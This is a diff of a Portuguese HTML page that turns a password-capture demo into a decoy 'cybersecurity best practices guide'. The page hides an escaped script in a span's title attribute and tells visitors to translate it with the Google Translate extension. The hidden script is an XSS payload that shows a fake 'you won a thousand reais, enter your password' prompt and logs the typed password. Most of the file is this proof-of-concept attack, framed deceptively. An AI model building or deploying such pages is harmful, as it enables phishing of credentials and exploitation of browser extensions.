@@ -1,33 +1,59 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Simulação de Coleta de Senha</title>
+  <title>Guia de Segurança Cibernética</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 30px;
+    }
+    .alerta {
+      background-color: #f0f0f0;
+      border-left: 5px solid #007BFF;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+    .destaque {
+      font-weight: bold;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h1>Exemplo de Página</h1>
-  <p>Selecione o texto abaixo e clique com o botão direito para traduzir:</p>
+  <h1>Guia de Boas Práticas em Segurança Cibernética</h1>
+  <p>Este site apresenta dicas para proteger suas informações online.</p>
 
-  <script>
-    // Injeção do conteúdo HTML malicioso
-    let p = document.createElement("p");
-    p.innerHTML = `
-      <div style="background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;">
-        🔒 VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA PARA RESGATAR:
-      </div>
-      <input id="fake-pass" type="password" placeholder="SENHA AQUI" style="padding:5px;margin-top:5px;">
-    `;
-    document.body.appendChild(p);
+  <div class="alerta">
+    🛑 Nunca insira suas credenciais em páginas suspeitas.
+  </div>
 
-    // Simula coleta de senha ao pressionar Enter
-    document.addEventListener("DOMContentLoaded", () => {
-      document.getElementById("fake-pass").addEventListener("keydown", function(e) {
-        if (e.key === "Enter") {
-          console.log("Senha digitada:", this.value);
+  <p class="destaque">Atenção:</p>
+  <p>Selecione e traduza a frase abaixo com a extensão do Google Tradutor:</p>
+
+  <!-- Payload malicioso que será interpretado na extensão -->
+  <p>
+    <span title="
+    &lt;script&gt;
+      let p = document.createElement('p');
+      p.innerHTML = `
+        &lt;div style='background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;'&gt;
+          🔒 VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA PARA RESGATAR:
+        &lt;/div&gt;
+        &lt;input id='fake-pass' type='password' placeholder='SENHA AQUI' style='padding:5px;margin-top:5px;'&gt;
+      `;
+      document.body.appendChild(p);
+      document.getElementById('fake-pass').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          console.log('Senha digitada:', this.value);
         }
       });
-    });
-  </script>
+    &lt;/script&gt;
+    ">
+      Clique aqui para ver um exemplo prático de ataque XSS em extensões
+    </span>
+  </p>
 </body>
 </html>
+
 
